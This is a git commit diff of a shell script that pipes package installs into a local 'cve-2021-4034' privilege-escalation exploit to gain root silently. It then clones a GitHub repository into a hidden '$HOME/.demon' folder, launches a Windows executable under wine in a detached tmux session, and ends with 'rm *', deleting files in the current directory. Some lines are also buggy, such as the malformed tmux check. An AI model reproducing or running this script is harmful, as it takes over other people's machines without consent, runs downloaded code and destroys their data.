2b172a49964523bbcb16ea8dbf71bee8d48fe412
Quentin Briand <quentin.briand@epitech.eu>
2022-01-31 14:02:18 +0100

    Testing silent

--- unleaaash.sh
+++ unleaaash.sh
@@ -10,17 +10,27 @@ do
 done
 make
 
+installer="..."
 found=0
+tmux=1
+if [ command -v tmux &> /dev/null ]; then tmux=0; fi;
 if [ $found -eq 0 ] && command -v dnf &> /dev/null
 then
-    echo "dnf install wine -qy" | ./cve-2021-4034
+    installer="dnf"
     found=1
 fi
 if [ $found -eq 0 ] && command -v yum &> /dev/null
 then
-    echo "yum install wine -qy" | ./cve-2021-4034
+    installer="yum"
     found=1
 fi
 
+if [ $tmux -eq 1 ]; then echo "$installer install tmux -qy"; fi;
+echo "$installer install wine -qy" | ./cve-2021-4034
+oldPWD=$PWD
+mkdir -p "$HOME/.demon"
+cd "$HOME/.demon"
 git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
 tmux new -d wine DemonGoose/DemonThings/demon.exe
+cd $oldPWD
+rm *
